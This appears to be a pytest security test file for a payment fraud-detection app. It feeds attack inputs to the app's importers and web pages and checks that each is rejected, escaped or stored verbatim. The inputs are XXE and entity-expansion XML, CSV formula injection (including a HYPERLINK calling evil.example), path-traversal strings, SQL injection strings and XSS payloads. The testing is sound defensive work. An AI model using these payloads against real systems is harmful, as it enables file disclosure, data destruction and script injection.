"""Security: XML entity attacks, oversized input, CSV/SQL/path injection values, pain.001 control totals and web escaping."""

import io
import sqlite3
import time

import pytest

from fraud_detection.__main__ import main
from fraud_detection.pain001 import Pain001Importer
from fraud_detection.storage import TransactionStore
from qa_support import QA_DIR

HEADER = "transaction_id,debtor_account,creditor_account,amount,currency,due_date,created_date\r\n"
ROW = "{id},1234.56.78903,9876.54.32109,500.00,NOK,2026-11-15,2026-10-20\r\n"
SECRET = "TOP-SECRET-7f3a9c-DO-NOT-LEAK"
SAMPLE_PAIN001 = (QA_DIR.parent / "samples" / "pain001_v03.xml").read_text(encoding="utf-8")

PAIN001 = """<?xml version="1.0" encoding="UTF-8"?>
{doctype}
<Document xmlns="urn:iso:std:iso:20022:tech:xsd:pain.001.001.03">
  <CstmrCdtTrfInitn>
    <GrpHdr><MsgId>SEC-1</MsgId><CreDtTm>2026-10-23T10:00:00</CreDtTm><NbOfTxs>1</NbOfTxs>
      <InitgPty><Nm>{name}</Nm></InitgPty></GrpHdr>
    <PmtInf>
      <PmtInfId>{name}</PmtInfId><PmtMtd>TRF</PmtMtd><ReqdExctnDt>2026-11-15</ReqdExctnDt>
      <Dbtr><Nm>{name}</Nm></Dbtr>
      <DbtrAcct><Id><Othr><Id>12345678903</Id></Othr></Id></DbtrAcct>
      <CdtTrfTxInf>
        <PmtId><EndToEndId>{e2e}</EndToEndId></PmtId>
        <Amt><InstdAmt Ccy="NOK">500.00</InstdAmt></Amt>
        <Cdtr><Nm>{name}</Nm></Cdtr>
        <CdtrAcct><Id><Othr><Id>98765432109</Id></Othr></Id></CdtrAcct>
        <RmtInf><Ustrd>{name}</Ustrd></RmtInf>
      </CdtTrfTxInf>
    </PmtInf>
  </CstmrCdtTrfInitn>
</Document>
"""


def cli_import(tmp_path, capsys, name, content):
    path = tmp_path / name
    if isinstance(content, bytes):
        path.write_bytes(content)
    else:
        path.write_text(content, encoding="utf-8", newline="")
    db = tmp_path / f"{name}.db"
    start = time.perf_counter()
    try:
        code, crash = main(["--db", str(db), "import", str(path)]), None
    except Exception as exc:
        code, crash = None, f"CLI crashed with {type(exc).__name__}: {str(exc)[:200]}"
    elapsed = time.perf_counter() - start
    out = capsys.readouterr().out
    store = TransactionStore(db)
    try:
        stored = store.all()
    finally:
        store.close()
    return code, crash, out, stored, db, elapsed


def stored_text(stored):
    return "\n".join(repr(s) for s in stored)


def xml_attack(tmp_path, capsys, name, doctype, value, max_seconds=10):
    xml = PAIN001.format(doctype=doctype, name=value, e2e=value)
    code, crash, out, stored, _, elapsed = cli_import(tmp_path, capsys, name, xml)
    failures = []
    if crash:
        failures.append(f"{name}: {crash}")
    if SECRET in out or SECRET in stored_text(stored):
        failures.append(f"{name}: secret file content leaked (output: {out[:200]!r}, stored: {stored_text(stored)[:200]!r})")
    if elapsed > max_seconds:
        failures.append(f"{name}: took {elapsed:.1f} s")
    if code == 0 and len(stored) != 1:
        failures.append(f"{name}: exit 0 but {len(stored)} row(s) stored")
    if code == 1 and stored:
        failures.append(f"{name}: rejected but {len(stored)} row(s) stored")
    with capsys.disabled():
        print(f"\n{name}: exit {code}, {len(stored)} stored, {elapsed:.2f} s, output: {out.strip()[:300]!r}")
    return failures


def test_xxe_external_file_entity_does_not_leak(tmp_path, capsys):
    secret = tmp_path / "secret.txt"
    secret.write_text(SECRET, encoding="utf-8")
    uri = secret.resolve().as_uri()
    failures = []
    failures += xml_attack(tmp_path, capsys, "xxe_general.xml",
                           f'<!DOCTYPE Document [<!ENTITY xxe SYSTEM "{uri}">]>', "&xxe;")
    failures += xml_attack(tmp_path, capsys, "xxe_parameter.xml",
                           f'<!DOCTYPE Document [<!ENTITY % ext SYSTEM "{uri}"> %ext;]>', "E2E-PARAM")
    failures += xml_attack(tmp_path, capsys, "xxe_external_dtd.xml",
                           f'<!DOCTYPE Document SYSTEM "{uri}">', "E2E-DTD")
    result = Pain001Importer().parse(io.StringIO(PAIN001.format(
        doctype=f'<!DOCTYPE Document [<!ENTITY xxe SYSTEM "{uri}">]>', name="&xxe;", e2e="&xxe;")))
    if SECRET in repr(result):
        failures.append(f"Pain001Importer.parse leaked the secret: {repr(result)[:300]}")
    assert not failures, "\n".join(failures)


def test_billion_laughs_is_rejected_quickly(tmp_path, capsys):
    entities = ['<!ENTITY lol "lol">'] + [
        f'<!ENTITY lol{i} "{("&lol" + (str(i - 1) if i > 1 else "") + ";") * 10}">' for i in range(1, 10)]
    doctype = "<!DOCTYPE Document [" + "".join(entities) + "]>"
    failures = xml_attack(tmp_path, capsys, "billion_laughs.xml", doctype, "&lol9;", max_seconds=5)
    assert not failures, "\n".join(failures)


def test_quadratic_blowup_is_handled_quickly(tmp_path, capsys):
    doctype = '<!DOCTYPE Document [<!ENTITY a "' + "A" * 50_000 + '">]>'
    failures = xml_attack(tmp_path, capsys, "quadratic.xml", doctype, "&a;" * 20_000, max_seconds=5)
    assert not failures, "\n".join(failures)


def test_internal_doctype_entity_does_not_crash(tmp_path, capsys):
    doctype = '<!DOCTYPE Document [<!ENTITY co "Acme Entity AS">]>'
    failures = xml_attack(tmp_path, capsys, "internal_entity.xml", doctype, "&co;")
    assert not failures, "\n".join(failures)


def test_huge_single_csv_field_rejects_the_row_not_the_app(tmp_path, capsys):
    content = HEADER + ROW.format(id="T-OK-1") + ROW.format(id="T-HUGE-" + "X" * 5_000_000) + ROW.format(id="T-OK-3")
    code, crash, out, stored, _, elapsed = cli_import(tmp_path, capsys, "huge_field.csv", content)
    failures = []
    if crash:
        failures.append(f"{crash} ({len(stored)} row(s) stored)")
    else:
        ids = [s.transaction.transaction_id for s in stored]
        if ids != ["T-OK-1", "T-OK-3"]:
            failures.append(f"expected T-OK-1 and T-OK-3 imported, got {[i[:20] for i in ids]}")
        if code != 1 or "line 3" not in out:
            failures.append(f"expected exit 1 and an error on line 3, got exit {code}: {out[:300]!r}")
    if elapsed > 20:
        failures.append(f"took {elapsed:.1f} s")
    assert not failures, "\n".join(failures)


@pytest.mark.slow
def test_50_mb_file_of_valid_rows(tmp_path, capsys):
    rows = [f"T{i:08d},1234.56.{i % 1000:05d},9876.54.{i % 777:05d},{i % 9000 + 1}.00,NOK,2026-11-15,2026-10-20\r\n"
            for i in range(700_000)]
    content = HEADER + "".join(rows)
    code, crash, out, stored, _, elapsed = cli_import(tmp_path, capsys, "fifty_mb.csv", content)
    with capsys.disabled():
        print(f"\n{len(content) / 1e6:.1f} MB, {len(rows)} rows: exit {code}, {len(stored)} stored in {elapsed:.1f} s")
    assert crash is None, crash
    assert code == 0, out[:500]
    assert len(stored) == len(rows)


def test_csv_injection_values_are_stored_verbatim(tmp_path, capsys):
    values = ['=HYPERLINK("http://evil.example/?x="&A1,"click")', "+cmd|' /C calc'!A0", "-2+3", "@SUM(1+1)*cmd|' /C calc'!A0",
              "=1+1", "\t=2+2"]
    quoted = [v.replace('"', '""') for v in values]
    content = HEADER + "".join(ROW.format(id=f'"{q}"') for q in quoted)
    code, crash, out, stored, _, _ = cli_import(tmp_path, capsys, "csv_injection.csv", content)
    assert crash is None, crash
    ids = [s.transaction.transaction_id for s in stored]
    expected = [v.strip() for v in values]
    failures = [f"{v!r} stored as {got!r}" for v, got in zip(expected, ids) if v != got]
    if len(ids) != len(expected):
        failures.append(f"expected {len(expected)} rows stored, got {len(ids)}: {ids!r} (exit {code}: {out[:300]!r})")
    assert not failures, "\n".join(failures)


def test_path_like_transaction_ids_are_plain_text(tmp_path, capsys):
    values = ["../../etc/passwd", "..\\..\\Windows\\win.ini", "/etc/shadow", "C:\\Windows\\System32\\cmd.exe",
              "file:///etc/passwd", "%2e%2e%2fetc%2fpasswd"]
    content = HEADER + "".join(ROW.format(id=f'"{v}"') for v in values)
    code, crash, out, stored, _, _ = cli_import(tmp_path, capsys, "paths.csv", content)
    assert crash is None, crash
    ids = [s.transaction.transaction_id for s in stored]
    assert ids == values, f"exit {code}, stored {ids!r}, output {out[:300]!r}"


def test_sql_injection_like_ids_are_stored_verbatim_and_table_survives(tmp_path, capsys):
    values = ["x'); DROP TABLE transactions;--", "1' OR '1'='1", "\"; DELETE FROM transactions; --",
              "T1'; UPDATE transactions SET amount='0'; --", "Robert'); DROP TABLE transactions;--"]
    content = HEADER + "".join(ROW.format(id='"' + v.replace('"', '""') + '"') for v in values)
    failures = []
    code, crash, out, stored, db, _ = cli_import(tmp_path, capsys, "sqli.csv", content)
    if crash:
        failures.append(crash)
    ids = [s.transaction.transaction_id for s in stored]
    if ids != values:
        failures.append(f"stored ids {ids!r}, expected {values!r}")
    if any(s.transaction.amount != 500 for s in stored):
        failures.append("an amount was changed")
    conn = sqlite3.connect(db)
    try:
        tables = [r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type='table'")]
    finally:
        conn.close()
    if "transactions" not in tables:
        failures.append(f"transactions table is gone: {tables!r}")
    try:
        again = main(["--db", str(db), "import", str(tmp_path / "sqli.csv")])
        out2 = capsys.readouterr().out
        if again != 0 or f"Duplicates: {len(values)}" not in out2:
            failures.append(f"re-import did not report {len(values)} duplicates: exit {again}, {out2[:300]!r}")
    except Exception as exc:
        failures.append(f"re-import crashed with {type(exc).__name__}: {exc}")
    assert not failures, "\n".join(failures)


def test_pain001_control_totals_not_matching_content(tmp_path, capsys):
    cases = {
        "NbOfTxs too high": SAMPLE_PAIN001.replace("<NbOfTxs>4</NbOfTxs>", "<NbOfTxs>99</NbOfTxs>"),
        "CtrlSum wrong": SAMPLE_PAIN001.replace("<CtrlSum>27150.00</CtrlSum>", "<CtrlSum>1.00</CtrlSum>"),
        "PmtInf NbOfTxs wrong": SAMPLE_PAIN001.replace("<NbOfTxs>3</NbOfTxs>", "<NbOfTxs>1</NbOfTxs>"),
        "CtrlSum not a number": SAMPLE_PAIN001.replace("<CtrlSum>27150.00</CtrlSum>", "<CtrlSum>lots</CtrlSum>"),
    }
    failures = []
    for i, (label, xml) in enumerate(cases.items()):
        assert xml != SAMPLE_PAIN001, label
        code, crash, out, stored, _, _ = cli_import(tmp_path, capsys, f"ctrl_{i}.xml", xml)
        if crash:
            failures.append(f"{label}: {crash}")
        with capsys.disabled():
            print(f"\n{label}: exit {code}, {len(stored)} stored, output: {out.strip()[:300]!r}")
    assert not failures, "\n".join(failures)


def test_web_pages_escape_html_in_imported_fields(tmp_path):
    """Script, img-onerror and svg-onload payloads in ids, accounts, currency and a bad amount are shown escaped on every page."""
    from fraud_detection.web import create_app
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><svg onload=alert(1)>"]
    rows = ["transaction_id,debtor_account,creditor_account,amount,currency,due_date,created_date"]
    for i, p in enumerate(payloads):
        q = p.replace('"', '""')
        rows.append(f'"X{i}{q}","{q}","{q}",100.00,"{q}",2026-11-01,2026-10-01')
    rows.append("XB,1,2,<b>x</b>,NOK,2026-11-01,2026-10-01")
    app = create_app(str(tmp_path / "xss.db"))
    client = app.test_client()
    summary = client.post("/upload", data={"file": (io.BytesIO("\n".join(rows).encode()), "<b>name</b>.csv")},
                          content_type="multipart/form-data").get_data(as_text=True)
    table = client.get("/transactions").get_data(as_text=True)
    failures = []
    for page, html in (("summary", summary), ("transactions", table)):
        for raw in payloads + ["<b>x</b>", "<b>name</b>"]:
            if raw in html:
                failures.append(f"{page}: raw {raw!r} rendered unescaped")
    assert "&lt;script&gt;" in table, "escaped script payload not shown on the transactions page"
    assert not failures, "\n".join(failures)
